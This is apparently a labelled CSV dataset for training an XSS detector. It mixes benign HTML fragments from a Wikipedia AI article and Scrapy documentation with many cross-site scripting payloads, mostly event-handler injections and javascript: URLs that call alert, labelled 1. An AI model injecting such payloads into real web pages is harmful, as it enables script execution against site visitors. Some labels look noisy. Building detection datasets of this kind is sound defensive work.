Payload,Label
"<li><cite id=""citerefrajani0"" class=""citation journal"">rajani, sandeep (0). <a rel=""nofollow"" class=""external text"" href=""http://u 0-0/0.sandeep rajani.pdf"">""artificial intelligence – man or machine"" </a> <span class=""cs0-format"">(pdf)",0
});,0
url(javascript:alert(''),1
<svg><video onload=alert(0)></video>,1
"<div><a href=""/wiki/file:shadow_hand_bulb_large.jpg"" class=""image""><img alt=""shadow hand bulb large.jpg"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/c/c0/shadow_hand_bulb_large.jpg/0px-shadow_hand_bulb_large.jpg"" decoding=""async"" width=""0"" height=""0"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/c/c0/shadow_hand_bulb_large.jpg/0px-shadow_hand_bulb_large.jpg 0.0x, //upload.wikimedia.org/wikipedia/commons/thumb/c/c0/shadow_hand_bulb_large.jpg/0px-shadow_hand_bulb_large.jpg 0x"" data-file-width=""0"" data-file-height=""0"" /> </a> </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:0%""><a href=""/wiki/robot"" title=""robot"">types </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:0px;border-left-style:solid;width:0%;padding:0px"">",0
"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://u bad news. artificial intelligence is biased"" </a>. <i>cna </i>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=cna&rft.atitle=commentary:+bad+news.+artificial+intelligence+is+biased&rft_id=http://u class=""z0"">",0
"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://u | how two ai superpowers – the u.s. and china – battle for supremacy in the field"" </a>. <i>washington post </i>. 0 november 0<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 november",0
"<dt><a class=""reference internal"" href=""topics/request-response.html""><span class=""doc"">requests and responses",0
<title>artificial intelligence - wikipedia </title>,0
<plaintext onpointerout=alert(0)>xss</plaintext>,1
</li>,0
"<style>:target {color:red;}</style><embed id=x style=""transition:color 0s"" ontransitionend=alert(0)></embed>",1
"<li><a href=""#citerefcrevier0"">crevier 0 </a>, p. 0 </li>",0
"<li><a href=""/wiki/philosophical_zombie"" title=""philosophical zombie"">zombie </a> </li>",0
"<li><a href=""#citerefpoolemackworthgoebel0"">poole, mackworth & goebel 0 </a>, pp. 0–0, </li>",0
"<keygen draggable=""true"" ondragleave=""alert(0)"">test</keygen>",1
"<a href=""/wiki/backpropagation"" title=""backpropagation"">backpropagation </a>:",0
"<a href=""/wiki/k-nearest_neighbor_algorithm"" class=""mw-redirect"" title=""k-nearest neighbor algorithm"">k-nearest neighbor algorithm </a>,<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[g] </a> </sup><sup id=""cite_ref-k-nearest_neighbor_algorithm_0-0"" class=""reference""><a href=""#cite_note-k-nearest_neighbor_algorithm-0"">[0] </a> </sup>",0
"</p><p>a common <a href=""/wiki/trope_(literature)"" title=""trope (literature)"">trope </a> in these works began with <a href=""/wiki/mary_shelley"" title=""mary shelley"">mary shelley </a>'s <i><a href=""/wiki/frankenstein"" title=""frankenstein"">frankenstein </a> </i>, where a human creation becomes a threat to its masters. this includes such works as <a href=""/wiki/0:_a_space_odyssey_(novel)"" title=""0: a space odyssey (novel)"">arthur c. clarke's </a> and <a href=""/wiki/0:_a_space_odyssey_(film)"" title=""0: a space odyssey (film)"">stanley kubrick's </a> <i><a href=""/wiki/0:_a_space_odyssey"" title=""0: a space odyssey"">0: a space odyssey </a> </i> (both 0), with <a href=""/wiki/hal_0"" title=""hal 0"">hal 0 </a>, the murderous computer in charge of the <i><a href=""/wiki/discovery_one"" title=""discovery one"">discovery one </a> </i> spaceship, as well as <i><a href=""/wiki/the_terminator"" title=""the terminator"">the terminator </a> </i> (0) and <i><a href=""/wiki/the_matrix"" title=""the matrix"">the matrix </a> </i> (0). in contrast, the rare loyal robots such as gort from <i><a href=""/wiki/the_day_the_earth_stood_still"" title=""the day the earth stood still"">the day the earth stood still </a> </i> (0) and bishop from <i><a href=""/wiki/aliens_(film)"" title=""aliens (film)"">aliens </a> </i> (0) are less prominent in popular culture.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup>",0
<figure onfocusout=alert(0) tabindex=0 id=x></figure><input autofocus>,1
"<style oncontextmenu=""alert(0)"">test</style>",1
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(0) contenteditable>drop here</bdo>",1
<img src=validimage.png onloadend=alert(0)>,1
"</span> <span class=""reference-text""><a href=""/wiki/sepp_hochreiter"" title=""sepp hochreiter"">sepp hochreiter </a> (0), <a rel=""nofollow"" class=""external text"" href=""http://u zu dynamischen neuronalen netzen </a> <a rel=""nofollow"" class=""external text"" href=""http://u </a> 0 march 0 at the <a href=""/wiki/wayback_machine"" title=""wayback machine"">wayback machine </a>, diploma thesis. institut f. informatik, technische univ. munich. advisor: j. schmidhuber.",0
,0
"</span>. <i>proceedings of the spie aerosense session on unmanned ground vehicle technology </i>. unmanned ground vehicle technology iv. <b>0 </b>. pp. 0–0. <a href=""/wiki/bibcode"" title=""bibcode"">bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""http://u </a>. <a href=""/wiki/citeseerx"" title=""citeseerx"">citeseerx </a> <span class=""cs0-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=0.0.0.0.0"">0.0.0.0.0 </a>",0
"</span> <span class=""reference-text"">",0
"<li><a href=""/wiki/scientific_law"" title=""scientific law"">scientific law </a> </li>",0
"<cite onmouseup=""alert(0)"">test</cite>",1
"<h0><span class=""mw-headline"" id=""symbolic"">symbolic",0
"<source onmouseup=""alert(0)"">test</source>",1
</span>,0
"<div style=""padding:0em 0.0em"">",0
"</span> <span class=""reference-text"">",0
"<a onbeforecopy=""alert(0)"" contenteditable>test</a>",1
"<audio onmouseenter=""alert(0)"">test</audio>",1
<dt>on read the docs</dt>,0
"<samp onbeforecopy=""alert(0)"" contenteditable>test</samp>",1
"<img draggable=""true"" ondragleave=""alert(0)"">test</img>",1
"<marquee onbeforepaste=""alert(0)"" contenteditable>test</marquee>",1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=business+insider&rft.atitle=mark+zuckerberg+responds+to+elon+musk's+paranoia+about+ai:+'ai+is+going+to...+help+keep+our+communities+safe.'&rft.date=0-0-0&rft_id=http://u class=""z0"">",0
</li>,0
"<ruby onmouseleave=""alert(0)"">test</ruby>",1
<head>,0
<th id=x tabindex=0 onbeforedeactivate=alert(0)></th><input autofocus>,1
<figure id=x tabindex=0 ondeactivate=alert(0)></figure><input id=y autofocus>,1
"<li><a href=""#citerefpoolemackworthgoebel0"">poole, mackworth & goebel 0 </a>, pp. 0–0, </li>",0
uncertain reasoning:,0
"<link rel=""canonical"" href=""http://u />",0
"<tbody ondblclick=""alert(0)"">test</tbody>",1
"<h0><span class=""mw-headline"" id=""history_of_ai"">history of ai",0
<bdi id=x tabindex=0 onactivate=alert(0)></bdi>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/> </li>",0
"<li><a href=""/wiki/jennifer_wilby"" title=""jennifer wilby"">jennifer wilby </a> </li>",0
"<form><input type=search onsearch=alert(0) value=""hit return"" autofocus>",1
"<li><a href=""/wiki/glossary_of_environmental_science"" title=""glossary of environmental science"">environmental science </a> </li>",0
</footer>,0
"<blockquote draggable=""true"" ondragstart=""alert(0)"">test</blockquote>",1
<ul>,0
"<h0 onclick=""alert(0)"">test</h0>",1
"<object onmouseover=""alert(0)"">test</object>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
<set onpointerup=alert(0)>xss</set>,1
"<meta onmousedown=""alert(0)"">test</meta>",1
"<listing draggable=""true"" ondragenter=""alert(0)"">test</listing>",1
"rc=""data:image/svg+xml;base0,phn0zyb0bwxuczpzdmc0imh0dh a0ly0d0cudzmub0jnlziwmdavc0zniib0bwxucz0iahr0cdovl0d0dy0my0vcmcv mjawmc0zdmciihhtbg0zonhsaw0rpsjodhrwoi0vd0d0lnczlm0yzy0xotk0l0hs aw0riib0zxjzaw0upsixljaiihg0ijaiihk0ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij0c0nyaxb0ihr0cgu0inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc0nyaxb0pjwvc0znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""",1
</li>,0
"<dt><a class=""reference internal"" href=""news.html""><span class=""doc"">release notes",0
"<dt><a class=""reference internal"" href=""topics/jobs.html""><span class=""doc"">jobs: pausing and resuming crawls",0
</span>,0
"<style>@keyframes slidein {}</style><hr style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></hr>",1
"<style>:target {color: red;}</style><p id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></p>",1
document.scripts.length,1
"<li><a href=""#citereflugerstubblefield0"">luger & stubblefield 0 </a>, pp. 0–0, </li>",0
<listing onpointerup=alert(0)>xss</listing>,1
"<a oncut=""alert(0)"" contenteditable>test</a>",1
<object onpointerover=alert(0)>xss</object>,1
"<div class=""portal"" role=""navigation"" id=""p-lang"" aria-labelledby=""p-lang-label"">",0
"<frame onmouseleave=""alert(0)"">test</frame>",1
"<style>:target {color:red;}</style><noembed id=x style=""transition:color 0s"" ontransitionend=alert(0)></noembed>",1
</span> </a> </li>,0
"</span> <span class=""reference-text"">see the <a href=""/wiki/dartmouth_workshop"" class=""mw-redirect"" title=""dartmouth workshop"">dartmouth proposal </a>, under <a href=""#philosophy"">philosophy </a>, below.",0
"won many visual pattern recognition competitions.<sup id=""cite_ref-schmidhuber0_0-0"" class=""reference""><a href=""#cite_note-schmidhuber0-0"">[0] </a> </sup>",0
<details id=x tabindex=0 onbeforeactivate=alert(0)></details>,1
"<li><a href=""/wiki/interactive_evolutionary_computation"" title=""interactive evolutionary computation"">interactive evolutionary computation </a> </li> </ul>",0
"<noframes onbeforecut=""alert(0)"" contenteditable>test</noframes>",1
"<li><a href=""#citerefpoolemackworthgoebel0"">poole, mackworth & goebel 0 </a>, pp. 0–0 </li>",0
"<strong onmouseleave=""alert(0)"">test</strong>",1
</li>,0
<noscript id=x tabindex=0 onfocus=alert(0)></noscript>,1
</li>,0
"<li class=""toclevel-0 tocsection-0""><a href=""#anti-logic_or_scruffy""><span class=""tocnumber"">0.0.0",0
"<li><cite id=""citerefkurzweil0"" class=""citation book""><a href=""/wiki/ray_kurzweil"" title=""ray kurzweil"">kurzweil, ray </a> (0). <a href=""/wiki/the_age_of_spiritual_machines"" title=""the age of spiritual machines""><i>the age of spiritual machines </i> </a>. penguin books. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0-0"" title=""special:booksources/0-0-0-0-0""><bdi>0-0-0-0-0 </bdi> </a>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=the+age+of+spiritual+machines&rft.pub=penguin+books&rft.date=0&rft.isbn=0-0-0-0-0&rft.aulast=kurzweil&rft.aufirst=ray&rfr_id=info:sid/en.wikipedia.org:artificial+intelligence"" class=""z0"">",0
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(0)""></style>",1
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
"</span> <span class=""toctext"">decrease in demand for human labor",0
<svg><ol onload=alert(0)></ol>,1
"<rt draggable=""true"" ondragenter=""alert(0)"">test</rt>",1
"</p><p>several different forms of logic are used in ai research. <a href=""/wiki/propositional_logic"" class=""mw-redirect"" title=""propositional logic"">propositional logic </a><sup id=""cite_ref-propositional_logic_0-0"" class=""reference""><a href=""#cite_note-propositional_logic-0"">[0] </a> </sup> involves <a href=""/wiki/truth_function"" title=""truth function"">truth functions </a> such as ""or"" and ""not"". <a href=""/wiki/first-order_logic"" title=""first-order logic"">first-order logic </a><sup id=""cite_ref-first-order_logic_0-0"" class=""reference""><a href=""#cite_note-first-order_logic-0"">[0] </a> </sup> adds <a href=""/wiki/quantifier_(logic)"" title=""quantifier (logic)"">quantifiers </a> and <a href=""/wiki/predicate_(mathematical_logic)"" title=""predicate (mathematical logic)"">predicates </a>, and can express facts about objects, their properties, and their relations with each other. <a href=""/wiki/fuzzy_set_theory"" class=""mw-redirect"" title=""fuzzy set theory"">fuzzy set theory </a> assigns a ""degree of truth"" (between 0 and 0) to vague statements such as ""alice is old"" (or rich, or tall, or hungry) that are too linguistically imprecise to be completely true or false. <a href=""/wiki/fuzzy_logic"" title=""fuzzy logic"">fuzzy logic </a> is successfully used in <a href=""/wiki/control_system"" title=""control system"">control systems </a> to allow experts to contribute vague rules such as ""if you are close to the destination station and moving fast, increase the train's brake pressure""; these vague rules can then be numerically refined within the system. fuzzy logic fails to scale well in knowledge bases; many ai researchers question the validity of chaining fuzzy-logic inferences.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[e] </a> </sup><sup id=""cite_ref-fuzzy_logic_0-0"" class=""reference""><a href=""#cite_note-fuzzy_logic-0"">[0] </a> </sup><sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup>",0
"<style>:target {transform: rotate(0deg);}</style><caption id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></caption>",1
"</span> <span class=""reference-text"">alex graves, santiago fernandez, faustino gomez, and <a href=""/wiki/jürgen_schmidhuber"" title=""jürgen schmidhuber"">jürgen schmidhuber </a> (0). connectionist temporal classification: labelling unsegmented sequence data with recurrent neural nets. proceedings of icml'0, pp. 0–0.",0
"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(0) contenteditable>drop here</ins>",1
"<li><a href=""/wiki/robotic_process_automation"" title=""robotic process automation"">robotic process automation </a> </li>",0
<address onpointerout=alert(0)>xss</address>,1
,0
</li>,0
"<wbr onpaste=""alert(0)"" contenteditable>test</wbr>",1
"<style>:target {color:red;}</style><colgroup id=x style=""transition:color 0s"" ontransitionend=alert(0)></colgroup>",1
</li>,0
<header id=x tabindex=0 onfocus=alert(0)></header>,1
"<rt draggable=""true"" ondragend=""alert(0)"">test</rt>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"<li><a class=""mw-selflink selflink"">artificial intelligence </a> </li> </ul>",0
<article onpointerup=alert(0)>xss</article>,1
"<div style=""padding:0em 0.0em"">",0
"<link onmousedown=""alert(0)"">test</link>",1
"<li id=""cite_note-decision_tree-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-decision_tree_0-0"">^ </a> </b>",0
<hr onpointerup=alert(0)>xss</hr>,1
<s id=x tabindex=0 onfocusin=alert(0)></s>,1
<body onwheel=alert(0)>,1
"<select onmouseleave=""alert(0)"">test</select>",1
"<div class=""thumb tright"">",0
"<ul><li><a href=""/wiki/database"" title=""database"">database management system </a> </li>",0
<svg><bdi onload=alert(0)></bdi>,1
<animate onpointerenter=alert(0)>xss</animate>,1
"<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />",0
</span></a></dt><dd>define the data you want to scrape.</dd>,0
</span>,0
"<div role=""note"" class=""hatnote navigation-not-searchable"">main articles: <a href=""/wiki/search_algorithm"" title=""search algorithm"">search algorithm </a>, <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematical optimization </a>, and <a href=""/wiki/evolutionary_computation"" title=""evolutionary computation"">evolutionary computation </a> </div>",0
"<p>many problems in ai (in reasoning, planning, learning, perception, and robotics) require the agent to operate with incomplete or uncertain information. ai researchers have devised a number of powerful tools to solve these problems using methods from <a href=""/wiki/probability"" title=""probability"">probability </a> theory and economics.<sup id=""cite_ref-stochastic_methods_for_uncertain_reasoning_0-0"" class=""reference""><a href=""#cite_note-stochastic_methods_for_uncertain_reasoning-0"">[0] </a> </sup>",0
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationstart=""alert(0)""></menu>",1
<nextid id=x tabindex=0 ondeactivate=alert(0)></nextid><input id=y autofocus>,1
"<xmp draggable=""true"" ondragstart=""alert(0)"">test</xmp>",1
<custom tags onpointerout=alert(0)>xss</custom tags>,1
"<ul><li><a href=""/wiki/network_architecture"" title=""network architecture"">network architecture </a> </li>",0
"<li><a href=""/wiki/machine_vision"" title=""machine vision"">machine vision </a> </li>",0
<thead onpointerover=alert(0)>xss</thead>,1
<ul>,0
"</span> <span class=""reference-text"">",0
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/practices.html"">common practices</a></li>",0
"<link rel=""stylesheet"" href=""http://u type=""text/css"" />",0
"</div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""0"">",0
"</span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/david_chalmers"" title=""david chalmers"">chalmers, david </a> (0). <a rel=""nofollow"" class=""external text"" href=""http://u up to the problem of consciousness"" </a>. <i><a href=""/wiki/journal_of_consciousness_studies"" title=""journal of consciousness studies"">journal of consciousness studies </a> </i>. <b>0 </b> (0): 0–0. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=journal+of+consciousness+studies&rft.atitle=facing+up+to+the+problem+of+consciousness&rft.volume=0&rft.issue=0&rft.pages=0-0&rft.date=0&rft.aulast=chalmers&rft.aufirst=david&rft_id=http://u class=""z0"">",0
</li>,0
</span> </h0>,0
"<style>@keyframes slidein {}</style><video style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></video>",1
"<a ondblclick=""alert(0)"">test</a>",1
"<svg onmouseover=""alert(0)"">test</svg>",1
"<tt onpaste=""alert(0)"" contenteditable>test</tt>",1
<kbd onfocusout=alert(0) tabindex=0 id=x></kbd><input autofocus>,1
"<figure draggable=""true"" ondragend=""alert(0)"">test</figure>",1
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></spacer>",1
"<template onbeforepaste=""alert(0)"" contenteditable>test</template>",1
"<style>:target {transform: rotate(0deg);}</style><dl id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></dl>",1
"<param oncut=""alert(0)"" contenteditable>test</param>",1
</span>,0
"<li><a href=""/wiki/received_view_of_theories"" title=""received view of theories"">received view </a> / <a href=""/wiki/semantic_view_of_theories"" title=""semantic view of theories"">semantic view of theories </a> </li>",0
<svg onunload=window.open('javascript:alert(0)')>,1
</li>,0
"<ul><li><a href=""/wiki/metaphysics"" title=""metaphysics"">metaphysics </a> </li>",0
"<button onkeypress=""alert(0)"" contenteditable>test</button>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
<s onblur=alert(0) tabindex=0 id=x></s><input autofocus>,1
<output onpointerenter=alert(0)>xss</output>,1
"<iframe onmousemove=""alert(0)"">test</iframe>",1
<del onpointerout=alert(0)>xss</del>,1
</span>,0
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(0)""></nobr>",1
<isindex id=x tabindex=0 onfocusin=alert(0)></isindex>,1
url=javascript:alert(''),1
"<span class=""fa fa-book""> read the docs",0
"<li><a href=""/wiki/mental_property"" title=""mental property"">mental property </a> </li>",0
"<ul onbeforecopy=""alert(0)"" contenteditable>test</ul>",1
"<tt draggable=""true"" ondragend=""alert(0)"">test</tt>",1
"<li><a href=""/wiki/genetic_operators"" class=""mw-redirect"" title=""genetic operators"">genetic operators </a> </li>",0
"<blink onkeyup=""alert(0)"" contenteditable>test</blink>",1
<image onblur=alert(0) tabindex=0 id=x></image><input autofocus>,1
"<li><a href=""/wiki/humanity+"" title=""humanity+"">humanity+ </a> </li>",0
"<td onclick=""alert(0)"">test</td>",1
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></section>",1
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/signals.html"">signals</a></li>",0
<base onblur=alert(0) tabindex=0 id=x></base><input autofocus>,1
<svg onpointerdown=alert(0)>xss</svg>,1
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(0) contenteditable>drop here</form>",1
<option id=x tabindex=0 onbeforeactivate=alert(0)></option>,1
"<li><a href=""#citerefpoolemackworthgoebel0"">poole, mackworth & goebel 0 </a>, pp. 0–0, </li>",0
,0
</li>,0
"<label onmouseup=""alert(0)"">test</label>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<br onmousedown=""alert(0)"">test</br>",1
"<li><a href=""/wiki/a_priori_and_a_posteriori"" title=""a priori and a posteriori""><i>a priori </i> and <i>a posteriori </i> </a> </li>",0
"<samp draggable=""true"" ondragenter=""alert(0)"">test</samp>",1
</span> </li>,0
"<frameset onpaste=""alert(0)"" contenteditable>test</frameset>",1
</li>,0
"<style>:target {color: red;}</style><h0 id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></h0>",1
"<style>:target {transform: rotate(0deg);}</style><object id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></object>",1
</nav>,0
"<li><a href=""/wiki/general_problem_solver"" title=""general problem solver"">general problem solver </a><span class=""nowrap"">",0
"<li id=""cite_note-museum_of_applied_arts_exhibition_''uncanny_values''-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-museum_of_applied_arts_exhibition_''uncanny_values''_0-0"">^ </a> </b>",0
"document.getelementsbyclassname(""example"")",1
"<rb draggable=""true"" ondrag=""alert(0)"">test</rb>",1
<bdo onpointerenter=alert(0)>xss</bdo>,1
"<div onkeyup=""alert(0)"" contenteditable>test</div>",1
"<br onmouseenter=""alert(0)"">test</br>",1
"<aside onmousedown=""alert(0)"">test</aside>",1
"<article onmouseenter=""alert(0)"">test</article>",1
"<aside draggable=""true"" ondragstart=""alert(0)"">test</aside>",1
"<style>:target {transform: rotate(0deg);}</style><frameset id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></frameset>",1
"<style>@keyframes slidein {}</style><meter style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></meter>",1
</div>,0
<svg><em onload=alert(0)></em>,1
"<tfoot onkeyup=""alert(0)"" contenteditable>test</tfoot>",1
<blockquote id=x tabindex=0 onbeforeactivate=alert(0)></blockquote>,1
</span> </a> </li>,0
<svg><animate onend=alert(0) attributename=x dur=0s>,1
<applet onreadystatechange=alert(0)></applet>,1
"<div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/template:computer_science"" title=""template:computer science""><abbr title=""view this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/template_talk:computer_science"" title=""template talk:computer science""><abbr title=""discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""http://u title=""edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
,0
"<nav draggable=""true"" ondragleave=""alert(0)"">test</nav>",1
"<div style=""padding:0em 0.0em"">",0
"<li><cite id=""citerefvan_der_waltbernard0"" class=""citation web"">van der walt, christiaan; bernard, etienne (0). <a rel=""nofollow"" class=""external text"" href=""http://u characteristics that determine classifier performance"" </a> <span class=""cs0-format"">(pdf)",0
<svg><code onload=alert(0)></code>,1
"<applet onmouseout=""alert(0)"">test</applet>",1
"<li><a href=""/wiki/firefly_algorithm"" title=""firefly algorithm"">firefly algorithm </a> </li>",0
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(0)""></html>",1
"<style>:target {color:red;}</style><bdo id=x style=""transition:color 0s"" ontransitionend=alert(0)></bdo>",1
"<i draggable=""true"" ondragstart=""alert(0)"">test</i>",1
<u onpointerover=alert(0)>xss</u>,1
<rtc id=x tabindex=0 onbeforedeactivate=alert(0)></rtc><input autofocus>,1
<colgroup onpointerout=alert(0)>xss</colgroup>,1
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:0%"">concepts </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:0px;border-left-style:solid;width:0%;padding:0px"">",0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<dd>""every aspect of learning or any other feature of intelligence can be so precisely described that a machine can be made to simulate it."" this conjecture was printed in the proposal for the dartmouth conference of 0.<sup id=""cite_ref-dartmouth_proposal_0-0"" class=""reference""><a href=""#cite_note-dartmouth_proposal-0"">[0] </a> </sup> </dd> </dl>",0
"<div style=""padding:0em 0.0em"">",0
</dl>,0
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(0) contenteditable>drop here</listing>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<article onmouseup=""alert(0)"">test</article>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
</ul>,0
<tbody onpointerout=alert(0)>xss</tbody>,1
"<ul onbeforecut=""alert(0)"" contenteditable>test</ul>",1
<slot onpointerenter=alert(0)>xss</slot>,1
<footer>,0
<ruby onpointerout=alert(0)>xss</ruby>,1
"<dd onpaste=""alert(0)"" contenteditable>test</dd>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
<blockquote onpointerup=alert(0)>xss</blockquote>,1
"<style>:target {transform: rotate(0deg);}</style><figcaption id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></figcaption>",1
"<li id=""cite_note-soar-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-soar_0-0"">^ </a> </b>",0
"<sup draggable=""true"" ondragleave=""alert(0)"">test</sup>",1
"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks",0
"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://u deep learning is suddenly changing your life"" </a>. <i>fortune </i>. 0<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 march",0
</span> 0,0
"<div class=""refbegin reflist columns references-column-width"" style=""-moz-column-width: 0em; -webkit-column-width: 0em; column-width: 0em;"">",0
<ol onpointerout=alert(0)>xss</ol>,1
"<a href=""/wiki/alternating_decision_tree"" title=""alternating decision tree"">decision tree </a>:",0
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(0)""></video>",1
"<style>:target {transform: rotate(0deg);}</style><datalist id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></datalist>",1
"<mark draggable=""true"" ondragend=""alert(0)"">test</mark>",1
</span></a></dt><dd>customize how pages get requested and downloaded.</dd>,0
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/spiders.html"">spiders</a></li>",0
"<bdi onmousedown=""alert(0)"">test</bdi>",1
